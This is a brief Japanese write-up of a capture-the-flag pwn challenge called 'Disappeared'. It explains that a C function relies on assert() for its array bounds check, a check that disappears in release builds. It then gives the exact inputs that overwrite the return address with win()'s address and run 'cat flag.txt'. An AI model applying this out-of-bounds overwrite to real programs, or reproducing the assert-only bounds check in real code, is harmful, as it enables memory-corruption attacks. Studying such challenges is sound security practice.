# Disappeared

https://alpacahack.com/daily/challenges/disappeared

## 問題の概要

配列の範囲外に書き込みを行って `win()` 関数を呼び出すことを目指す PWN 問題です。

```c
void safe() {
    unsigned num[100], pos;
    printf("pos > ");
    scanf("%u", &pos);
    assert(pos<100);
    printf("val > ");
    scanf("%u", &num[pos]);
}
```

`unsigned` 型の変数に `"%u"` で入力を行っているところには問題はなく、負の数やサイズを超える入力は行われません。
`&num[pos]` の指定方法も正しく、`pos < 100` であれば配列の範囲外に書き込むことはできません。

## 解法

`assert(pos<100);` で `pos < 100` が保証されているように見えますが、`assert` はデバッグ用のマクロであり、リリースビルドでは無効化されます。

したがって、`&num[pos]` がリターンアドレスを指すように `pos` を設定し、`win()` 関数のアドレスを書き込めばよいです。

## 回答に使用した入力

```
106
4198838
cat flag.txt
```
